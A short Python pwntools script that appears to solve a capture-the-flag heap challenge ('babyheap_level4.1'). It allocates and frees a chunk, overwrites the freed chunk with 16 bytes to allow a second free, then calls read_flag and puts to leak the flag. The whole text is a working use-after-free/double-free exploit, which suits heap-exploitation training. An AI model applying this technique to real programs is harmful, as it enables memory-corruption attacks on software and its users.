from pwn import *

p = process("/challenge/babyheap_level4.1")

p.sendline(b'malloc')
p.sendline(b'331')
p.sendline(b'free')
p.sendline(b'scanf')
p.recv()
p.sendline(b'A' * 16)
p.sendline(b'free')
p.sendline(b'read_flag')
p.sendline(b'puts')

p.interactive()

